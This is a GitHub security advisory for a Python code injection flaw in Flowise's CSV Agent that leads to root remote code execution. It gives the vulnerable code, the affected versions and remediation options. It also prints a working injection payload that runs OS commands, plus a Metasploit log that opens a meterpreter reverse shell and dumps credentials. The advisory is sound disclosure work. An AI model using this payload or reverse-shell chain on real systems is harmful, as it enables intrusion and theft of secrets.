# [C] Flowise: CSV Agent Remote Code Execution via Pyodide Code Injection — Root Shell Verified

## Summary
Severity: Critical
Advisory: GHSA-vmv7-4m6c-3cg5
CVE: CVE-2026-69255
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-04
Source: https://github.com/advisories/GHSA-vmv7-4m6c-3cg5
Type: github-advisory

## Affected
- npm: `flowise` — affected >=0 <3.1.3
- npm: `flowise-components` — affected >=0 <3.1.3

## Details
## UPDATE 2026-05-20: Full RCE as root VERIFIED

**This is not theoretical — a Meterpreter reverse shell session as root has been established on Flowise 3.1.2.**

### Verified Exploit Chain

1. Python code injection via `base64_string = "${base64String}"` (CSVAgent.ts line 161)
2. Pyodide `js` bridge provides access to the host Node.js process
3. `process.mainModule.constructor._load('child_process')` loads child_process (bypasses ESM require restriction)
4. `.execSync('CMD')` executes arbitrary OS commands as **root** (PID 1 in container)

### Working RCE Payload

```
";import js;e=js.globalThis.eval;e("process.mainModule.constructor._load('child_process').execSync('id')");#
```

**Constraint:** No commas allowed in payload — `csvFile.split(',')` splits on all commas.

### Metasploit Session Proof

```
msf > use exploit/multi/http/flowise_csv_agent_rce
msf > set PAYLOAD cmd/linux/http/x64/meterpreter/reverse_tcp
msf > exploit

[+] Authentication successful
[+] Created chatflow: b6716feb-63c8-4fd2-993f-cd43788704b4
[*] Sending stage (3090404 bytes) to 172.17.0.2
[*] Meterpreter session 1 opened (172.17.0.1:4444 -> 172.17.0.2:41422)

meterpreter > getuid
Server username: root

meterpreter > sysinfo
Computer     : cbce3fb352b7
OS           : Linux 6.8.0-111-generic
Architecture : x64
Meterpreter  : x64/linux

meterpreter > shell
# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)

# uname -a
Linux cbce3fb352b7 6.8.0-111-generic x86_64 Linux
```

### Additional Verified Impact

**Credential Theft:**
```
FLOWISE_PASSWORD=admin123
DATABASE_PATH=/root/.flowise
APIKEY_PATH=...
```

**Arbitrary File Read** via `process.binding('fs').readFileUtf8('/etc/hostname')` → `cbce3fb352b7`

**Server DoS** — certain native binding calls (spawn_sync) crash the Node.js process entirely.

### CVSS v3.1: 9.9 CRITICAL

`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`

---

## Original Report (below)

## Vulnerable Code

**File:** `packages/components/nodes/agents/CSVAgent/CSVAgent.ts`

**Lines 133-138** — Unsanitized string extraction from data URI via `file.split(',').pop().pop()` — no validation on content.

**Lines 155-171** — Direct interpolation into executable Python code:
`base64_string = "${base64String}"` is inserted into a Python string literal via JS template literal. If the string contains a closing double-quote followed by Python code, it breaks out of the string context.

`validatePythonCodeForDataFrame()` denylist is only applied to LLM-generated code at line 198, NOT to this initial code block at line 171.

## Remediation

**Option 1 (Best):** Use `pyodide.globals.set('base64_string', base64String)` instead of string interpolation

**Option 2:** Validate base64 before interpolation — reject if not matching `/^[A-Za-z0-9+/=]*$/`

**Option 3:** Escape special characters (`"`, `\n`, `\r`, `\\`) before interpolation

## Related CVEs
- CVE-2026-41264 (CSV Agent regex bypass)
- CVE-2026-41265 (Airtable Agent sandbox bypass)
- CVE-2026-46442 (NodeVM sandbox escape)

**Disclosure:** Identified with AI assistance (Claude Code). Analysis, verification, and Metasploit module by S9S Bounty-LAB / Kamal Sentassi.

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-vmv7-4m6c-3cg5
- https://github.com/FlowiseAI/Flowise/pull/6499
- https://github.com/FlowiseAI/Flowise/commit/f4e2794f6a576b94578f2fdafbf49c2fb304626c
- https://github.com/FlowiseAI/Flowise
- https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.3
